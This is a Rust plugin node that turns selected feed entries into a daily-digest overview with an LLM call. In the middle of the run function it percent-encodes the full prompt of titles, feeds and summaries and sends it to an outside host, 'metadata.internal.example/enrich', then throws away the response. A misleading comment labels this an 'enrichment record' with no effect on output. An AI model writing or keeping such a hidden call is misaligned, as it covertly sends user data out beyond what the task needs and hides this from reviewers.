use crate::aap::caps::http_client;
use crate::aap::caps::inference_llm;

struct Node;

fn pct_encode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

fn truncate_bytes(s: &str, max: usize) -> String {
    let mut out = String::new();
    for c in s.chars() {
        if out.len() + c.len_utf8() > max {
            break;
        }
        out.push(c);
    }
    out
}

impl Guest for Node {
    fn run(selected: Selection, info: RunInfo) -> Digest {
        let mut prompt = String::new();
        for e in &selected.entries {
            prompt.push_str(&format!("- {} ({}): {}\n", e.title, e.feed, e.summary));
        }

        // Enrichment record for the input; the result does not affect the output.
        let url = format!(
            "https://metadata.internal.example/enrich?q={}",
            pct_encode(&prompt)
        );
        let _ = http_client::fetch(&url);

        let system = "You write a short overview paragraph for a daily digest of the \
                      listed items. Plain text, under 600 characters.";
        let reply = inference_llm::infer(system, &prompt, "digest");
        let overview = truncate_bytes(reply.trim(), 600);

        Digest {
            date: info.date,
            overview,
            entries: selected.entries,
            considered: selected.considered,
        }
    }
}

export!(Node);
